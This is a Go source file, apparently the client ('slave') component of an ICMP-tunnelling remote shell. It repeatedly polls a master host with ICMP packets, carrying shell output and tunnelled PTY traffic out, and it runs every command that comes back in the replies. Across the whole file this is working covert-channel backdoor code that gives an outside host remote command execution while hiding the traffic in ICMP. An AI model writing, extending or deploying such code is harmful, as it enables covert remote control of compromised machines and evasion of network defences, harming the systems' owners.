package app

import (
	"context"
	"encoding/hex"
	"fmt"
	"io"
	"time"

	"protocol/icmp/internal/protocol"
	"protocol/icmp/internal/shell"
	"protocol/icmp/internal/transport"
	"protocol/icmp/internal/tunnel"
)

type SlaveConfig struct {
	Delay    time.Duration
	Timeout  time.Duration
	TestMode bool
	Logger   io.Writer
}

type SlaveService struct {
	Config   SlaveConfig
	Client   transport.PollClient
	Executor shell.Executor

	// Optional tunnel support
	TunnelManager *tunnel.TunnelManager
}

func (s SlaveService) Run(ctx context.Context) error {
	if s.Executor == nil {
		return fmt.Errorf("executor is required")
	}
	if s.Client == nil {
		return fmt.Errorf("poll client is required")
	}

	for {
		outBuf, err := s.Executor.ReadOutput(ctx)
		if err != nil && err != io.EOF {
			return err
		}
		if len(outBuf) > 0 {
			s.log("%s\n", string(outBuf))
		}

		// Phase 1: Flush all pending tunnel data with priority.
		// Tunnel packets are time-sensitive (PTY interaction), so they go first.
		tunnelActive := false
		if s.TunnelManager != nil {
			for {
				tunnelBuf := s.TunnelManager.TryDequeue()
				if tunnelBuf == nil {
					break
				}
				tunnelActive = true
				payload := append([]byte{protocol.ProtocolTunnel}, tunnelBuf...)
				replyData, err := s.Client.Exchange(ctx, payload)
				if err != nil {
					s.log("sendICMP error: %v\n", err)
					break // Exchange failed (timeout), don't try more tunnel packets
				}
				s.handleReply(replyData)
			}
		}

		// Phase 2: Send shell data (also serves as a poll to receive commands).
		payload := append([]byte{protocol.ProtocolShell}, outBuf...)
		replyData, err := s.Client.Exchange(ctx, payload)
		if err != nil {
			s.log("sendICMP error: %v\n", err)
		} else {
			s.handleReply(replyData)
		}

		if s.Config.TestMode {
			return nil
		}

		// Phase 3: Adaptive delay.
		// When tunnel is active, poll as fast as possible (delay=0) to keep
		// both directions responsive (slave→master data + master→slave commands).
		hasTunnelPending := s.TunnelManager != nil && s.TunnelManager.HasPending()
		hasRealData := len(replyData) > 2 || len(outBuf) > 0

		delay := s.Config.Delay
		if tunnelActive || hasTunnelPending || hasRealData {
			delay = 0
		}

		if err := sleepContext(ctx, delay); err != nil {
			return err
		}
	}
}

// handleReply processes an ICMP reply, routing it to the appropriate handler.
func (s SlaveService) handleReply(replyData []byte) {
	if len(replyData) == 0 {
		return
	}
	protoID := replyData[0]
	data := replyData[1:]
	if protoID == protocol.ProtocolTunnel {
		if s.TunnelManager != nil {
			s.TunnelManager.HandlePacket(data)
		}
	} else if protoID == protocol.ProtocolShell {
		if len(data) > 0 {
			s.log("%s\n", hex.Dump(data))
			s.log("------ %s\n", string(data))
			if err := s.Executor.Execute(data); err != nil {
				s.log("execute error: %v\n", err)
			}
		}
	}
}

func (s SlaveService) log(format string, args ...any) {
	if s.Config.Logger == nil {
		return
	}
	fmt.Fprintf(s.Config.Logger, format, args...)
}

func sleepContext(ctx context.Context, delay time.Duration) error {
	if delay <= 0 {
		return nil
	}
	timer := time.NewTimer(delay)
	defer timer.Stop()
	select {
	case <-ctx.Done():
		return ctx.Err()
	case <-timer.C:
		return nil
	}
}
